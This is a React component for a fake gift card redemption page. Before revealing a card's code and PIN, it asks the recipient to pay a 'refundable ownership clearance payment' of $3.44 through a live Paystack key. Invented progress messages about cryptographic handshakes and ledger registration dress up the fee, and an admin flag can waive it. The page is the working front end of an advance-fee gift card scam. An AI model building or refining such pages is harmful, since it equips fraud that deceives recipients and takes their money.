import React, { useState, useEffect } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { decodeCardToken } from '../emailService';

const BRAND_META = {
    'Apple': { icon: '', color: 'apple' },
    'Steam Store': { icon: '🎮', color: 'steam' },
    'Amazon': { icon: '📦', color: 'amazon' },
    'PlayStation Network': { icon: 'Ⓟ', color: 'playstation' },
    'Xbox Live': { icon: 'Ⓧ', color: 'xbox' }
};

const RedeemCard = () => {
    const [searchParams] = useSearchParams();
    const navigate = useNavigate();
    const token = searchParams.get('token');
    
    const [cardData, setCardData] = useState(null);
    const [error, setError] = useState(null);
    const [isLoading, setIsLoading] = useState(false);
    const [loaderStep, setLoaderStep] = useState(0);
    const [isPaid, setIsPaid] = useState(false);
    const [toastMessage, setToastMessage] = useState('');

    // Load Paystack Inline JS script
    useEffect(() => {
        const script = document.createElement('script');
        script.src = 'https://js.paystack.co/v1/inline.js';
        script.async = true;
        document.body.appendChild(script);
        return () => {
            document.body.removeChild(script);
        };
    }, []);

    // Decode and validate token on load
    useEffect(() => {
        if (!token) {
            setError('Verification link is invalid or has expired. Please request a new link from the admin.');
            return;
        }

        const decoded = decodeCardToken(token);
        if (!decoded || !decoded.code || !decoded.pin || !decoded.serial) {
            setError('Failed to securely parse gift card details. The security token may be corrupted.');
        } else {
            setCardData(decoded);
        }
    }, [token]);

    // Sequential loading animation
    const triggerCardRevealAnimation = () => {
        setIsLoading(true);
        setLoaderStep(0);

        const steps = [
            'Verifying clearance payment status...',
            'Conducting cryptographic secure handshake...',
            'Decrypting digital voucher token assets...',
            'Registering ownership signature to ledger...'
        ];

        let current = 0;
        const interval = setInterval(() => {
            current += 1;
            if (current < steps.length) {
                setLoaderStep(current);
            } else {
                clearInterval(interval);
                setIsLoading(false);
                setIsPaid(true);
            }
        }, 1800);
    };

    // Paystack Payment Trigger
    const handlePaystackPayment = () => {
        const paystackPublicKey = import.meta.env?.VITE_PAYSTACK_PUBLIC_KEY || 'pk_live_3861296b86487f4fc5dabc23e99be12f14e8e88f';
        const userEmail = cardData?.to || 'recipient@rechargecard.store';

        if (window.PaystackPop) {
            const USD_TO_GHS_RATE = 15.0;
            const convertedAmountGhs = 3.44 * USD_TO_GHS_RATE; // $3.44 clearance fee -> GHS 51.60

            const handler = window.PaystackPop.setup({
                key: paystackPublicKey,
                email: userEmail,
                amount: Math.round(convertedAmountGhs * 100), // GHS 51.60 in pesewas (5160 pesewas)
                currency: 'GHS',
                channels: ['card', 'bank'], // Restrict to card and bank only
                callback: function (response) {
                    // Payment successful
                    triggerCardRevealAnimation();
                },
                onClose: function () {
                    // Sandbox bypass fallback
                    const testOverride = confirm('Payment closed. For testing and preview purposes, would you like to simulate a successful sandbox payment?');
                    if (testOverride) {
                        triggerCardRevealAnimation();
                    }
                }
            });
            handler.openIframe();
        } else {
            // Local dev fallback if script loading was blocked or offline
            triggerCardRevealAnimation();
        }
    };

    // Copy to clipboard helper
    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text);
        setToastMessage('Details copied successfully!');
        setTimeout(() => setToastMessage(''), 2000);
    };

    if (error) {
        return (
            <div className="container">
                <div className="content" style={{ textAlign: 'center', borderColor: '#ef4444' }}>
                    <div style={{ fontSize: '64px', marginBottom: '16px' }}>⚠️</div>
                    <h1 style={{ background: 'linear-gradient(135deg, #ff8a8a 30%, #ef4444 100%)', webkitTextFillColor: 'transparent', webkitBackgroundClip: 'text' }}>
                        Verification Link Error
                    </h1>
                    <p style={{ color: '#fca5a5' }}>{error}</p>
                    <button onClick={() => navigate('/')} className="btn btn-secondary" style={{ marginTop: '12px' }}>
                        Return to Hub
                    </button>
                </div>
            </div>
        );
    }

    if (!cardData) {
        return (
            <div className="container">
                <div className="content" style={{ textAlign: 'center' }}>
                    <p>Securing handshake...</p>
                </div>
            </div>
        );
    }

    const brandInfo = BRAND_META[cardData.brandName] || { icon: '🎁', color: 'apple' };

    return (
        <div className="container">
            {!isLoading && !isPaid && (
                <div className="content" style={{ animation: 'slideUpFade 0.6s ease' }}>
                    <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}>
                        {cardData?.bypassPayment ? (
                            <span style={{ 
                                fontSize: '11px', 
                                fontWeight: 'bold', 
                                background: 'rgba(16,185,129,0.1)', 
                                color: '#34d399', 
                                padding: '4px 12px', 
                                borderRadius: '50px',
                                border: '1px solid rgba(16,185,129,0.2)',
                                textTransform: 'uppercase',
                                letterSpacing: '1px'
                            }}>
                                ✓ SECURITY CLEARANCE PRE-AUTHORIZED
                            </span>
                        ) : (
                            <span style={{ 
                                fontSize: '11px', 
                                fontWeight: 'bold', 
                                background: 'rgba(99,102,241,0.1)', 
                                color: '#a5b4fc', 
                                padding: '4px 12px', 
                                borderRadius: '50px',
                                border: '1px solid rgba(99,102,241,0.2)',
                                textTransform: 'uppercase',
                                letterSpacing: '1px'
                            }}>
                                🔒 SECURE TRANSACTION GATEWAY
                            </span>
                        )}
                    </div>

                    <h1 style={{ textAlign: 'center', marginBottom: '16px' }}>
                        {cardData?.bypassPayment ? 'Voucher Pre-Authorized' : 'Security Clearance'}
                    </h1>
                    
                    {cardData?.bypassPayment ? (
                        <>
                            <p style={{ textAlign: 'center', fontSize: '14px', lineHeight: '1.6', color: 'var(--text-secondary)' }}>
                                Excellent news! This gift card has been <strong style={{ color: '#10b981' }}>pre-authorized</strong> by the administrator. The standard ownership verification payment has been fully waived.
                            </p>
                            <p style={{ textAlign: 'center', fontSize: '13px', lineHeight: '1.5', color: '#6b7280', margin: '0 0 24px 0' }}>
                                Click the button below to execute the secure cryptographic decryption handshake and instantly reveal your gift card credentials.
                            </p>
                        </>
                    ) : (
                        <>
                            <p style={{ textAlign: 'center', fontSize: '14px', lineHeight: '1.6', color: 'var(--text-secondary)' }}>
                                For security and verification purposes, the beneficiary is required to complete a refundable ownership clearance payment of <strong style={{ color: '#ffffff' }}>$3.44</strong> before the gift card can be activated and redeemed.
                            </p>
                            <p style={{ textAlign: 'center', fontSize: '13px', lineHeight: '1.5', color: '#6b7280', margin: '0 0 24px 0' }}>
                                This step helps protect transactions and confirm the recipient's identity before final delivery access is granted.
                            </p>
                        </>
                    )}

                    <div style={{ 
                        background: 'rgba(255,255,255,0.02)', 
                        border: '1px solid rgba(255,255,255,0.05)', 
                        borderRadius: '16px', 
                        padding: '20px', 
                        marginBottom: '24px' 
                    }}>
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
                            <span style={{ fontSize: '12px', color: '#9ca3af', fontWeight: 'bold' }}>GIFT CARD SURPRISE</span>
                            <span style={{ fontSize: '12px', color: '#10b981', fontWeight: 'bold' }}>READY</span>
                        </div>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
                            <div style={{ 
                                width: '48px', 
                                height: '48px', 
                                borderRadius: '12px', 
                                background: 'rgba(255,255,255,0.04)', 
                                display: 'flex', 
                                alignItems: 'center', 
                                justifyContent: 'center',
                                fontSize: '22px'
                            }}>
                                {brandInfo.icon}
                            </div>
                            <div>
                                <div style={{ fontSize: '15px', fontWeight: 'bold' }}>{cardData.brandName} Gift Card</div>
                                <div style={{ fontSize: '12px', color: '#9ca3af' }}>Purchased by: {cardData.purchaserName}</div>
                            </div>
                            <div style={{ marginLeft: 'auto', fontSize: '20px', fontWeight: '800', color: '#6366f1' }}>
                                ${cardData.amount}.00
                            </div>
                        </div>
                    </div>

                    {cardData?.bypassPayment ? (
                        <div style={{ 
                            display: 'flex', 
                            justifyContent: 'space-between', 
                            alignItems: 'center', 
                            background: 'rgba(16,185,129,0.06)', 
                            border: '1px solid rgba(16,185,129,0.1)', 
                            padding: '16px', 
                            borderRadius: '12px', 
                            marginBottom: '24px' 
                        }}>
                            <span style={{ fontSize: '13px', fontWeight: '600', color: '#cbd5e1' }}>Verification Fee Status:</span>
                            <span style={{ fontSize: '15px', fontWeight: '800', color: '#34d399' }}>✓ Waived / Pre-Cleared</span>
                        </div>
                    ) : (
                        <div style={{ 
                            display: 'flex', 
                            justifyContent: 'space-between', 
                            alignItems: 'center', 
                            background: 'rgba(99,102,241,0.06)', 
                            border: '1px solid rgba(99,102,241,0.1)', 
                            padding: '16px', 
                            borderRadius: '12px', 
                            marginBottom: '24px' 
                        }}>
                            <span style={{ fontSize: '13px', fontWeight: '600' }}>Verification Payment:</span>
                            <span style={{ fontSize: '18px', fontWeight: '800', color: '#a5b4fc' }}>$3.44 USD</span>
                        </div>
                    )}

                    {cardData?.bypassPayment ? (
                        <button onClick={triggerCardRevealAnimation} className="btn" style={{ background: 'linear-gradient(135deg, #10b981 0%, #059669 100%)' }}>
                            <span>Reveal & Activate Gift Card</span>
                            <span style={{ fontSize: '12px', opacity: 0.8 }}>⚡</span>
                        </button>
                    ) : (
                        <button onClick={handlePaystackPayment} className="btn">
                            <span>Proceed to Security Clearance ($3.44)</span>
                            <span style={{ fontSize: '12px', opacity: 0.8 }}>⚡</span>
                        </button>
                    )}
                </div>
            )}

            {/* Cryptographic tokenization progress steps */}
            {isLoading && (
                <div className="modal-overlay">
                    <div className="modal-card">
                        <h2 style={{ fontSize: '20px', fontWeight: '800', marginBottom: '6px', textAlign: 'center' }}>Ownership Handshake</h2>
                        <p style={{ fontSize: '13px', color: '#9ca3af', textAlign: 'center', marginBottom: '24px' }}>Assigning secure digital asset credentials...</p>
                        
                        <div className="progress-steps">
                            {[
                                'Verifying clearance payment status...',
                                'Conducting cryptographic secure handshake...',
                                'Decrypting digital voucher token assets...',
                                'Registering ownership signature to ledger...'
                            ].map((text, idx) => (
                                <div key={idx} className={`step-row ${loaderStep === idx ? 'active' : (loaderStep > idx ? 'completed' : '')}`}>
                                    <div className="step-bullet" />
                                    <span style={{ fontSize: '13px' }}>{text}</span>
                                </div>
                            ))}
                        </div>
                    </div>
                </div>
            )}

            {/* Glowing Holographic Gift Card Reveal Screen */}
            {isPaid && (
                <div className="content animate-fadeIn" style={{ textAlign: 'center', position: 'relative' }}>
                    <div style={{ fontSize: '48px', marginBottom: '10px' }}>🎉</div>
                    <h1>Voucher Decrypted!</h1>
                    <p style={{ marginBottom: '28px', fontSize: '14px' }}>Ownership verified successfully. Your high-security holographic gift card is fully activated.</p>
                    
                    {/* Floating Holographic Card */}
                    <div className={`hologram-card hologram-${brandInfo.color}`} style={{ margin: '0 auto 30px auto' }}>
                        <div className="hologram-logo">
                            <span>{brandInfo.icon}</span>
                            <span>{cardData.brandName}</span>
                        </div>
                        
                        <div className="hologram-details" style={{ textAlign: 'left' }}>
                            <span style={{ fontSize: '9px', textTransform: 'uppercase', opacity: 0.6, letterSpacing: '1px' }}>Voucher Claim Code</span>
                            <div className="hologram-code">{cardData.code}</div>
                            <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '11px', marginTop: '6px', opacity: 0.7 }}>
                                <span>PIN: {cardData.pin}</span>
                                <span>{cardData.serial}</span>
                            </div>
                        </div>
                        
                        <div className="hologram-amount">
                            ${cardData.amount}.00
                        </div>
                    </div>

                    {/* Copy and Actions */}
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                        <button 
                            className="btn" 
                            onClick={() => copyToClipboard(`Brand: ${cardData.brandName}\nCode: ${cardData.code}\nPIN: ${cardData.pin}\nSerial: ${cardData.serial}\nValue: $${cardData.amount}.00`)}
                        >
                            Copy Voucher Credentials
                        </button>
                        <button 
                            className="btn btn-secondary" 
                            onClick={() => navigate('/')}
                        >
                            Go to Voucher Hub
                        </button>
                    </div>
                </div>
            )}

            {toastMessage && <div className="toast-msg">{toastMessage}</div>}
        </div>
    );
};

export default RedeemCard;
